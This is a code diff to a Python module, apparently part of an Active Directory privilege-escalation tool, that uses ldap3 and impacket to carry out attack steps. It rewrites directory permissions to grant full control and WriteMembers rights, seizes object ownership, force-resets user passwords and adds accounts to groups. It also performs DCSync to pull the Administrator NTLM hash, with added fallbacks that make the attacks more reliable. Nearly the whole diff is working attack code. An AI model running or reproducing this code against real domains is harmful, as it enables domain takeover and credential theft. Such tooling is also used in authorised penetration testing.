@@ -6,6 +6,7 @@ import re
 import subprocess
 from datetime import datetime
 from pathlib import Path
+from uuid import UUID
 
 import ldap3
 from impacket.krb5 import constants
@@ -21,12 +22,98 @@ from impacket.ldap import ldaptypes
 from impacket.ldap.ldaptypes import ACCESS_ALLOWED_ACE, ACCESS_ALLOWED_OBJECT_ACE, ACCESS_MASK, ACE
 
 
+def format_force_change_password_messages(target_identity, new_password, success=True):
+    """Return the exact action/result/context strings for a password reset log sequence."""
+    target_label = str(target_identity or "the target user").strip()
+    action_message = f'Changing the password of user {target_label} to "{new_password}"'
+
+    if success:
+        result_message = f'Password of user {target_label} successfully set to "{new_password}"'
+        context_message = f"Context changed to user {target_label} successfully."
+    else:
+        result_message = f"Password change failed for user {target_label}."
+        context_message = None
+
+    return {
+        "action_message": action_message,
+        "result_message": result_message,
+        "context_message": context_message,
+    }
+
+
+def format_add_group_member_messages(member_identity, group_identity, success=True):
+    """Return the exact action/result/context strings for an AddMember log sequence."""
+    member_label = str(member_identity or "the foothold user").strip()
+    group_label = str(group_identity or "the target group").strip()
+    action_message = f"Adding {member_label} into {group_label} group"
+
+    if success:
+        result_message = f"Successfully added {member_label} to {group_label} group."
+        context_message = f"Context changed to user {member_label} successfully."
+    else:
+        result_message = f"Failed to add {member_label} to {group_label} group."
+        context_message = None
+
+    return {
+        "action_message": action_message,
+        "result_message": result_message,
+        "context_message": context_message,
+    }
+
+
+def format_grant_addmember_messages(member_identity, group_identity, success=True):
+    """Return the exact action/result strings for granting WriteMembers rights on a group."""
+    member_label = str(member_identity or "the foothold user").strip()
+    group_label = str(group_identity or "the target group").strip()
+    action_message = f"Granting WriteMembers on {group_label} to {member_label}"
+
+    if success:
+        result_message = f"Successfully granted WriteMembers on {group_label} to {member_label}."
+    else:
+        result_message = f"Failed to grant WriteMembers on {group_label} to {member_label}."
+
+    return {
+        "action_message": action_message,
+        "result_message": result_message,
+        "context_message": None,
+    }
+
+
+def format_memberof_passive_message():
+    """Return the passive result string for a no-op MemberOf step."""
+    return {
+        "action_message": None,
+        "result_message": "Passive module, no actions needed.",
+        "context_message": None,
+    }
+
+
+def format_attack_completion_message(kind, subject, detail):
+    """Return the final completion context string for a successful privesc chain."""
+    subject_label = str(subject or "the target").strip()
+    detail_label = str(detail or "").strip()
+
+    if kind == "user":
+        return f'Attack successfully completed. {subject_label}\'s password has been updated to "{detail_label}".'
+    if kind == "group":
+        return f'Attack successfully completed. {subject_label} has been added to the group {detail_label}.'
+    if kind == "domain":
+        return f'Attack successfully completed. Administrator NTLM hash extracted: {detail_label}'
+    return "Attack successfully completed."
+
+
 class PrivescActions:
     def __init__(self, engine):
         self.engine = engine
         self.conn = engine.conn
         self.domain = engine.domain
         self.dc_ip = engine.dc_ip
+        self.last_grant_status = None
+        self.last_grant_diagnostic = None
+        self.last_grant_result = None
+        self.last_owner_status = None
+        self.last_owner_diagnostic = None
+        self.last_owner_result = None
 
     def _identity_variants(self, identity):
         """Return common AD identity aliases for the same principal."""
@@ -140,11 +227,14 @@ class PrivescActions:
     def load_security_descriptor(self, dn):
         """Read nTSecurityDescriptor for an object."""
         controls = security_descriptor_control(sdflags=0x07)
-        if self.conn.search(dn, "(objectClass=*)", search_scope=BASE, attributes=["nTSecurityDescriptor"], controls=controls) and self.conn.entries:
-            raw = self.conn.entries[0]["nTSecurityDescriptor"].raw_values[0]
-            sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
-            sd.fromString(raw)
-            return sd
+        try:
+            if self.conn.search(dn, "(objectClass=*)", search_scope=BASE, attributes=["nTSecurityDescriptor"], controls=controls) and self.conn.entries:
+                raw = self.conn.entries[0]["nTSecurityDescriptor"].raw_values[0]
+                sd = ldaptypes.SR_SECURITY_DESCRIPTOR()
+                sd.fromString(raw)
+                return sd
+        except Exception as exc:
+            logging.error("load_security_descriptor failed for %s: %s", dn, exc)
         return None
 
     def get_owner_sid(self, dn):
@@ -179,15 +269,21 @@ class PrivescActions:
             logging.warning("is_member_of_group(%s, %s) failed: %s", group_dn, user_dn, exc)
             return False
 
-    def save_security_descriptor(self, dn, sd):
+    def save_security_descriptor(self, dn, sd, sdflags=0x04):
         """Write nTSecurityDescriptor back to an object."""
-        controls = security_descriptor_control(sdflags=0x07)
-        self.conn.modify(dn, {"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [sd.getData()])]}, controls=controls)
+        controls = security_descriptor_control(sdflags=sdflags)
+        return self.conn.modify(dn, {"nTSecurityDescriptor": [(ldap3.MODIFY_REPLACE, [sd.getData()])]}, controls=controls)
 
     def grant_full_control(self, dn, sid):
         """Add a full-control ACE to an object's DACL."""
+        self.last_grant_status = None
+        self.last_grant_diagnostic = None
+        self.last_grant_result = None
+
         sd = self.load_security_descriptor(dn)
         if not sd:
+            self.last_grant_status = "failed"
+            self.last_grant_diagnostic = "Unable to load nTSecurityDescriptor for target object."
             return False
 
         ace = ACE()
@@ -210,34 +306,224 @@ class PrivescActions:
             dacl['AclRevision'] = 2
             dacl['Sbz1'] = 0
             dacl['Sbz2'] = 0
-            dacl['Data'] = []
+            dacl.aces = []
             sd['Dacl'] = dacl
 
-        if not hasattr(sd['Dacl'], 'Data'):
-            sd['Dacl']['Data'] = []
+        if not hasattr(sd['Dacl'], 'aces'):
+            sd['Dacl'].aces = []
 
-        sd['Dacl']['Data'].append(ace)
-        self.save_security_descriptor(dn, sd)
+        sd['Dacl'].aces.append(ace)
+        if not self.save_security_descriptor(dn, sd):
+            self.last_grant_result = dict(getattr(self.conn, "result", {}) or {})
+            code = self.last_grant_result.get("result")
+            desc = self.last_grant_result.get("description")
+            msg = self.last_grant_result.get("message")
+            self.last_grant_status = "failed"
+            self.last_grant_diagnostic = f"LDAP modify failed while writing GenericAll DACL (code={code}, description={desc}, message={msg})"
+            return False
+
+        self.last_grant_result = dict(getattr(self.conn, "result", {}) or {})
+        self.last_grant_status = "granted"
+        self.last_grant_diagnostic = "GenericAll ACE persisted."
         return True
+
+    def _resolve_schema_guid(self, ldap_display_name):
+        """Resolve an attribute schemaIDGUID from the directory schema."""
+        try:
+            if not self.conn.search(search_base="", search_filter="(objectClass=*)", search_scope=BASE, attributes=["schemaNamingContext"], size_limit=1) or not self.conn.entries:
+                return None
+            schema_nc = self.conn.entries[0].entry_attributes_as_dict.get("schemaNamingContext", [None])[0]
+            if not schema_nc:
+                return None
+            search_filter = f"(&(objectClass=attributeSchema)(lDAPDisplayName={ldap_display_name}))"
+            if not self.conn.search(search_base=str(schema_nc), search_filter=search_filter, search_scope=SUBTREE, attributes=["schemaIDGUID"], size_limit=1) or not self.conn.entries:
+                return None
+            raw_guid = self.conn.entries[0].entry_attributes_as_dict.get("schemaIDGUID", [None])[0]
+            if not raw_guid:
+                return None
+            if isinstance(raw_guid, bytes) and len(raw_guid) == 16:
+                return raw_guid
+            if isinstance(raw_guid, str):
+                try:
+                    return UUID(raw_guid).bytes_le
+                except Exception:
+                    pass
+            return bytes(raw_guid)
+        except Exception as exc:
+            logging.warning("schema GUID lookup failed for %s: %s", ldap_display_name, exc)
+            return None
 
     def grant_generic_all(self, dn, sid):
         """Grant a superset of GenericAll permissions by adding full control to the target DACL."""
         return self.grant_full_control(dn, sid)
 
     def grant_group_addmember(self, dn, sid):
-        """Grant member-write capability to a group, implemented as a superset DACL full-control grant."""
-        return self.grant_full_control(dn, sid)
+        """Grant WriteMembers by adding an object-specific ACE on the group member attribute."""
+        self.last_grant_status = None
+        self.last_grant_diagnostic = None
+        self.last_grant_result = None
+
+        sd = self.load_security_descriptor(dn)
+        if not sd:
+            self.last_grant_status = "failed"
+            self.last_grant_diagnostic = "Unable to load nTSecurityDescriptor for target group."
+            return False
+
+        member_guid = self._resolve_schema_guid("member")
+        if not member_guid:
+            logging.warning("member schema GUID lookup failed for %s", dn)
+            self.last_grant_status = "failed"
+            self.last_grant_diagnostic = "member schema GUID lookup failed"
+            return False
+
+        ace = ACE()
+        ace['AceType'] = ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
+        ace['AceFlags'] = 0x00
+        ace_data = ACCESS_ALLOWED_OBJECT_ACE()
+        ace_data['Mask'] = ACCESS_MASK()
+        ace_data['Mask']['Mask'] = (
+            ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_READ_PROP |
+            ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP
+        )
+        ace_data['Flags'] = ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
+        ace_data['ObjectType'] = member_guid
+        ace_data['InheritedObjectType'] = b''
+        ace_data['Sid'] = ldaptypes.LDAP_SID()
+        ace_data['Sid'].fromCanonical(sid)
+        ace['Ace'] = ace_data
+
+        try:
+            dacl = sd['Dacl']
+        except Exception:
+            dacl = None
+
+        logging.debug("grant_group_addmember DACL type: %s", type(dacl))
+        try:
+            logging.debug("grant_group_addmember DACL ace count: %s", len(dacl.aces) if dacl is not None and hasattr(dacl, 'aces') else None)
+            logging.debug("grant_group_addmember DACL aces: %r", dacl.aces if dacl is not None and hasattr(dacl, 'aces') else None)
+        except Exception:
+            pass
+
+        if dacl is None or dacl == b'':
+            dacl = ldaptypes.ACL()
+            dacl['AclRevision'] = 2
+            dacl['Sbz1'] = 0
+            dacl['Sbz2'] = 0
+            dacl.aces = []
+            sd['Dacl'] = dacl
+
+        if not hasattr(sd['Dacl'], 'aces'):
+            sd['Dacl'].aces = []
+
+        sd['Dacl'].aces.append(ace)
+        if not self.save_security_descriptor(dn, sd):
+            self.last_grant_result = dict(getattr(self.conn, "result", {}) or {})
+            code = self.last_grant_result.get("result")
+            desc = self.last_grant_result.get("description")
+            msg = self.last_grant_result.get("message")
+            self.last_grant_status = "failed"
+            self.last_grant_diagnostic = f"LDAP modify failed while writing DACL (code={code}, description={desc}, message={msg})"
+            logging.error("Failed to persist WriteMembers ACE on %s for SID %s: %s", dn, sid, self.last_grant_diagnostic)
+            return False
+
+        self.last_grant_result = dict(getattr(self.conn, "result", {}) or {})
+        fresh_sd = self.load_security_descriptor(dn)
+        if not fresh_sd:
+            self.last_grant_status = "failed"
+            self.last_grant_diagnostic = "Security descriptor reload failed after DACL write."
+            logging.error("Failed to verify persisted WriteMembers ACE on %s for SID %s: %s", dn, sid, self.last_grant_diagnostic)
+            return False
+
+        try:
+            fresh_dacl = fresh_sd['Dacl']
+        except Exception:
+            fresh_dacl = None
+
+        if fresh_dacl is None or not hasattr(fresh_dacl, 'aces'):
+            self.last_grant_status = "failed"
+            self.last_grant_diagnostic = "Reloaded security descriptor has no accessible DACL ACE list."
+            logging.error("Failed to verify persisted WriteMembers ACE on %s for SID %s: %s", dn, sid, self.last_grant_diagnostic)
+            return False
+
+        sid_canonical = str(sid)
+        matched = False
+        for persisted_ace in fresh_dacl.aces:
+            try:
+                if persisted_ace['AceType'] != ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE:
+                    continue
+                persisted = persisted_ace['Ace']
+                persisted_sid = persisted['Sid'].formatCanonical()
+                persisted_object_type = persisted['ObjectType']
+                persisted_mask = persisted['Mask']['Mask']
+                if (
+                    persisted_sid == sid_canonical
+                    and persisted_object_type == member_guid
+                    and persisted_mask == (
+                        ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_READ_PROP |
+                        ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_WRITE_PROP
+                    )
+                ):
+                    matched = True
+                    break
+            except Exception:
+                continue
+
+        if not matched:
+            self.last_grant_status = "failed"
+            self.last_grant_diagnostic = (
+                "WriteMembers ACE missing after writeback; expected object-specific ACE for member attribute "
+                "with READ_PROP|WRITE_PROP mask."
+            )
+            logging.error("WriteMembers ACE was not present after writeback on %s for SID %s", dn, sid)
+            return False
+
+        self.last_grant_status = "granted"
+        self.last_grant_diagnostic = "WriteMembers ACE persisted and verified."
+        logging.info("Granted WriteMembers via object-specific ACE on %s for SID %s using member GUID %s", dn, sid, member_guid.hex())
+        return True
 
     def set_owner(self, dn, sid):
         """Set the owner SID on an object's security descriptor."""
-        sd = self.load_security_descriptor(dn)
-        if not sd:
-            return False
+        self.last_owner_status = None
+        self.last_owner_diagnostic = None
+        self.last_owner_result = None
+        try:
+            sd = self.load_security_descriptor(dn)
+            if not sd:
+                self.last_owner_status = "failed"
+                self.last_owner_diagnostic = "Unable to load nTSecurityDescriptor for owner change."
+                return False
 
-        sd['OwnerSid'] = ldaptypes.LDAP_SID()
-        sd['OwnerSid'].fromCanonical(sid)
-        self.save_security_descriptor(dn, sd)
-        return True
+            sd['OwnerSid'] = ldaptypes.LDAP_SID()
+            sd['OwnerSid'].fromCanonical(sid)
+
+            # Owner changes must be sent with OWNER_SECURITY_INFORMATION.
+            if not self.save_security_descriptor(dn, sd, sdflags=0x01):
+                self.last_owner_result = dict(getattr(self.conn, "result", {}) or {})
+                code = self.last_owner_result.get("result")
+                desc = self.last_owner_result.get("description")
+                msg = self.last_owner_result.get("message")
+                self.last_owner_status = "failed"
+                self.last_owner_diagnostic = f"LDAP modify failed while writing owner (code={code}, description={desc}, message={msg})"
+                return False
+
+            self.last_owner_result = dict(getattr(self.conn, "result", {}) or {})
+
+            fresh_owner = self.get_owner_sid(dn)
+            if str(fresh_owner or "") != str(sid):
+                self.last_owner_status = "failed"
+                self.last_owner_diagnostic = f"Owner verification failed after write (expected={sid}, actual={fresh_owner})"
+                return False
+
+            self.last_owner_status = "changed"
+            self.last_owner_diagnostic = "Owner SID persisted and verified."
+            return True
+        except Exception as exc:
+            self.last_owner_status = "failed"
+            self.last_owner_result = dict(getattr(self.conn, "result", {}) or {})
+            self.last_owner_diagnostic = f"Owner change exception: {exc}"
+            logging.error("set_owner failed for %s (sid=%s): %s", dn, sid, exc)
+            return False
 
     def resolve_target(self, rel):
         """Resolve the most useful target endpoint for a relationship."""
@@ -308,13 +594,36 @@ class PrivescActions:
         return raw_user
 
     def force_change_password(self, target_dn, new_password):
+        from core.logger import logger
+
+        target_label = str(target_dn or "the target user")
+        logger.info(
+            "PRIVESC",
+            "privesc.force_change_password.started",
+            f"Attempting ForceChangePassword against {target_label}",
+            source="web.app",
+            details={"target_dn": target_dn, "password_length": len(str(new_password or ""))},
+        )
         print(f"[*] Exploiting ForceChangePassword on {target_dn}...")
         try:
             result = self.conn.extend.microsoft.modify_password(target_dn, new_password)
             if result:
-                print(f"[+] Password successfully changed to: {new_password}")
+                logger.info(
+                    "PRIVESC",
+                    "privesc.force_change_password.success",
+                    f"ForceChangePassword succeeded for {target_label}",
+                    source="web.app",
+                    details={"target_dn": target_dn, "password_length": len(str(new_password or ""))},
+                )
+                print(f"[+] {format_force_change_password_messages(target_label, new_password, success=True)['result_message']}")
             else:
-                # Provide LDAP diagnostic info when available
+                logger.warning(
+                    "PRIVESC",
+                    "privesc.force_change_password.failed",
+                    f"ForceChangePassword returned a falsey result for {target_label}",
+                    source="web.app",
+                    details={"target_dn": target_dn, "ldap_result": getattr(self.conn, 'result', {})},
+                )
                 try:
                     diag = getattr(self.conn, 'result', {})
                     print(f"  [!] LDAP RESULT: {diag}")
@@ -322,6 +631,13 @@ class PrivescActions:
                     pass
             return result
         except Exception as exc:
+            logger.error(
+                "PRIVESC",
+                "privesc.force_change_password.exception",
+                f"ForceChangePassword failed for {target_label}: {exc}",
+                source="web.app",
+                details={"target_dn": target_dn, "error": str(exc)},
+            )
             print(f"  [!] ForceChangePassword call failed: {exc}")
             try:
                 diag = getattr(self.conn, 'result', {})
@@ -332,6 +648,9 @@ class PrivescActions:
 
     def add_group_member(self, group_dn, user_dn):
         # user_dn may be a distinguishedName or a sam/UPN; resolve to DN if needed
+        self.last_group_member_status = None
+        self.last_group_member_message = None
+        self.last_group_member_result = None
         try:
             resolved_user_dn = user_dn
             if not isinstance(user_dn, str) or not user_dn.upper().startswith("CN="):
@@ -357,38 +676,92 @@ class PrivescActions:
             success = self.conn.modify(group_dn, {"member": [(MODIFY_ADD, [resolved_user_dn])]})
             # always print LDAP result for diagnostics
             try:
-                print(f"  [*] LDAP modify result: {self.conn.result}")
+                self.last_group_member_result = dict(getattr(self.conn, "result", {}) or {})
+                print(f"  [*] LDAP modify result: {self.last_group_member_result}")
             except Exception:
                 pass
 
             if not success:
-                result_code = self.conn.result.get("result")
-                diagnostic = self.conn.result.get("message") or self.conn.result.get("description")
+                result_code = getattr(self.conn, "result", {}).get("result")
+                diagnostic = getattr(self.conn, "result", {}).get("message") or getattr(self.conn, "result", {}).get("description")
                 if result_code == 68 or (diagnostic and "already a member" in str(diagnostic).lower()):
-                    print(f"  [-] {display_user} is already a member of this group. Skipping safely.")
+                    self.last_group_member_status = "already_member"
+                    self.last_group_member_message = f"{display_user} is already a member of this group. Proceeding."
+                    print(f"  [-] {display_user} is already a member of this group. Proceeding.")
                     return True
 
-                print(f"  [!] LDAP MODIFY_ADD failed (code={result_code}): {diagnostic}")
+                diagnostic_text = f"LDAP MODIFY_ADD failed (code={result_code}, diagnostic={diagnostic or 'none'})"
+                print(f"  [!] {diagnostic_text}")
+                from core.logger import logger
+
+                logger.error(
+                    "PRIVESC",
+                    "privesc.add_group_member.failed",
+                    diagnostic_text,
+                    source="web.app",
+                    details={
+                        "target_dn": group_dn,
+                        "member": display_user,
+                        "resolved_user_dn": resolved_user_dn,
+                        "ldap_result": self.last_group_member_result,
+                    },
+                )
+                self.last_group_member_status = "failed"
+                self.last_group_member_message = f"Failed to add {display_user} to {group_dn}. {diagnostic_text}"
                 return False
 
             print(f"  [+] Added {display_user} to {group_dn}")
+            self.last_group_member_status = "added"
+            self.last_group_member_message = f"Successfully added {display_user} to {group_dn} group."
             return True
         except Exception as e:
             print(f"  [!] Exception while adding member: {e}")
             try:
-                print(f"  [!] LDAP RESULT: {getattr(self.conn, 'result', {})}")
+                self.last_group_member_result = dict(getattr(self.conn, 'result', {}) or {})
+                print(f"  [!] LDAP RESULT: {self.last_group_member_result}")
             except Exception:
                 pass
+            from core.logger import logger
+
+            logger.error(
+                "PRIVESC",
+                "privesc.add_group_member.exception",
+                f"Exception while adding member {display_user} to {group_dn}: {e}",
+                source="web.app",
+                details={
+                    "target_dn": group_dn,
+                    "member": display_user,
+                    "resolved_user_dn": resolved_user_dn,
+                    "error": str(e),
+                    "ldap_result": self.last_group_member_result,
+                },
+            )
+            self.last_group_member_status = "failed"
+            self.last_group_member_message = f"Failed to add {display_user} to {group_dn}. Exception: {e}"
             return False
 
     def dcsync(self, current_password):
         """Perform DCSync as the current principal and recover Administrator's NTLM hash."""
 
+        from core.logger import logger
+
         actor = self._resolve_kerberos_username()
         target = "Administrator"
         remote_ops = None
+        self.last_dcsync_hash = None
+        stage = "startup"
+        selected_samr_domain = None
+
+        logger.info(
+            "PRIVESC",
+            "privesc.dcsync.started",
+            f"Starting DCSync as {actor or 'unknown'} against {self.domain}",
+            source="web.app",
+            details={"actor": actor, "domain": self.domain, "dc_ip": self.dc_ip, "target": target},
+        )
 
         try:
+            stage = "smb_login"
             smb = SMBConnection(
                 self.dc_ip,
                 self.dc_ip,
@@ -400,13 +773,47 @@ class PrivescActions:
                 self.domain
             )
 
+            stage = "connect_samr"
             remote_ops = RemoteOperations(
                 smb,
                 False,
                 kdcHost=self.dc_ip
             )
-            remote_ops.connectSamr(self.domain)
 
+            # Use the same SAMR domain discovery pattern as secretsdump for cross-env stability.
+            candidate_domains = []
+            try:
+                _, machine_domain = remote_ops.getMachineNameAndDomain()
+                if machine_domain:
+                    candidate_domains.append(str(machine_domain))
+            except Exception:
+                pass
+
+            if self.domain:
+                candidate_domains.append(str(self.domain))
+                if "." in str(self.domain):
+                    candidate_domains.append(str(self.domain).split(".")[0])
+
+            samr_connected = False
+            samr_errors = []
+            seen_candidates = set()
+            for domain_candidate in candidate_domains:
+                cleaned = str(domain_candidate or "").strip()
+                if not cleaned or cleaned.lower() in seen_candidates:
+                    continue
+                seen_candidates.add(cleaned.lower())
+                try:
+                    remote_ops.connectSamr(cleaned)
+                    selected_samr_domain = cleaned
+                    samr_connected = True
+                    break
+                except Exception as exc:
+                    samr_errors.append(f"{cleaned}: {exc}")
+
+            if not samr_connected:
+                raise Exception(f"Failed to connect SAMR domain context ({'; '.join(samr_errors)})")
+
+            stage = "resolve_sid"
             raw_sid = self.get_object_sid(target)
 
             if not raw_sid:
@@ -423,11 +830,75 @@ class PrivescActions:
 
             target_sid = sid_obj.formatCanonical()
 
+            stage = "drs_request"
             print("[*] Performing DCSync")
 
-            user_record = remote_ops.DRSGetNCChangesSid(
-                target_sid
-            )
+            try:
+                user_record = remote_ops.DRSGetNCChangesSid(target_sid)
+            except Exception as drs_exc:
+                # Some environments reject SID-based DRS object replication with BAD_NC.
+                # Follow secretsdump behavior: fallback to DRSCrackNames -> GUID lookup.
+                sid_error = str(drs_exc)
+                fallback_errors = []
+                user_record = None
+
+                try:
+                    from impacket.dcerpc.v5 import drsuapi as drsuapi_v5
+                except Exception:
+                    drsuapi_v5 = None
+
+                if drsuapi_v5 is not None:
+                    candidate_accounts = []
+                    if selected_samr_domain:
+                        candidate_accounts.append(f"{selected_samr_domain}\\{target}")
+                    if self.domain:
+                        netbios = str(self.domain).split(".")[0]
+                        candidate_accounts.append(f"{netbios}\\{target}")
+                    candidate_accounts.append(target)
+
+                    seen_accounts = set()
+                    for account_name in candidate_accounts:
+                        candidate = str(account_name or "").strip()
+                        if not candidate or candidate.lower() in seen_accounts:
+                            continue
+                        seen_accounts.add(candidate.lower())
+
+                        try:
+                            if "\\" in candidate or "/" in candidate:
+                                offered = drsuapi_v5.DS_NAME_FORMAT.DS_NT4_ACCOUNT_NAME
+                                crack_name = candidate.replace("/", "\\")
+                            else:
+                                offered = drsuapi_v5.DS_NT4_ACCOUNT_NAME_SANS_DOMAIN
+                                crack_name = candidate
+
+                            cracked = remote_ops.DRSCrackNames(
+                                offered,
+                                drsuapi_v5.DS_NAME_FORMAT.DS_UNIQUE_ID_NAME,
+                                name=crack_name,
+                            )
+
+                            result = cracked["pmsgOut"]["V1"]["pResult"]
+                            c_items = int(result["cItems"])
+                            if c_items != 1:
+                                fallback_errors.append(f"{candidate}: crack returned {c_items} items")
+                                continue
+
+                            item = result["rItems"][0]
+                            status = int(item["status"])
+                            if status != 0:
+                                fallback_errors.append(f"{candidate}: crack status={status}")
+                                continue
+
+                            user_guid = item["pName"][:-1]
+                            user_record = remote_ops.DRSGetNCChangesGuid(user_guid)
+                            break
+                        except Exception as fallback_exc:
+                            fallback_errors.append(f"{candidate}: {fallback_exc}")
+
+                if user_record is None:
+                    if "ERROR_DS_DRA_BAD_NC" in sid_error and fallback_errors:
+                        raise Exception(f"{sid_error} | GUID fallback failed ({'; '.join(fallback_errors)})")
+                    raise
 
             reply_version = f"V{user_record['pdwOutVersion']}"
             reply = user_record['pmsgOut'][reply_version]
@@ -463,7 +934,6 @@ class PrivescActions:
                 skipUser=None,
                 ldapFilter=None,
                 printUserStatus=False,
-                localDomainSid=None,
                 perSecretCallback=hash_callback
             )
 
@@ -502,10 +972,28 @@ class PrivescActions:
                 f"{administrator_hash}"
             )
 
-            return True
+            self.last_dcsync_hash = administrator_hash
+
+            logger.info(
+                "PRIVESC",
+                "privesc.dcsync.success",
+                f"DCSync succeeded for {actor or 'unknown'}",
+                source="web.app",
+                details={"actor": actor, "domain": self.domain, "dc_ip": self.dc_ip, "target": target, "proof_value": administrator_hash, "samr_domain": selected_samr_domain},
+            )
+
+            return administrator_hash
 
         except Exception as e:
+            logger.error(
+                "PRIVESC",
+                "privesc.dcsync.exception",
+                f"DCSync failed at stage {stage} for {actor or 'unknown'}: {e}",
+                source="web.app",
+                details={"actor": actor, "domain": self.domain, "dc_ip": self.dc_ip, "target": target, "stage": stage, "error": str(e), "samr_domain": selected_samr_domain},
+            )
             print(f"[!] DCSync Failed: {e}")
+            self.last_dcsync_hash = None
             return False
 
         finally:
